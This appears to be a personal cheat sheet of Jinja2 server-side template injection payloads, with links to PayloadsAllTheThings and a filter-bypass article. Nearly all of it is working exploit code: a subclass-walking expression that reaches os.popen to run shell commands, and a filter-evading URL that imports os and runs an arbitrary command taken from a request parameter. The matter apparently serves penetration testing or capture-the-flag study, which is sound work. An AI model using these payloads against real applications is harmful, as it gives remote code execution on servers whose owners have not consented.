# SSTI Payloads

### Link: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
### Bypasses: https://0day.work/jinja2-template-injection-filter-bypasses/

```py
${''.__class__.__mro__[1].__subclasses__()}

{{''.__class__.__mro__[1].__subclasses__()[280].__init__.__globals__['__builtins__']['__import__']('os').popen('ls ..').read()}}
```

# Filter bypasses:
1. Filter: . [ ] {{ }} x \
```py
http://0.0.0.0:3000/home?token=<>&directory={%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=id
```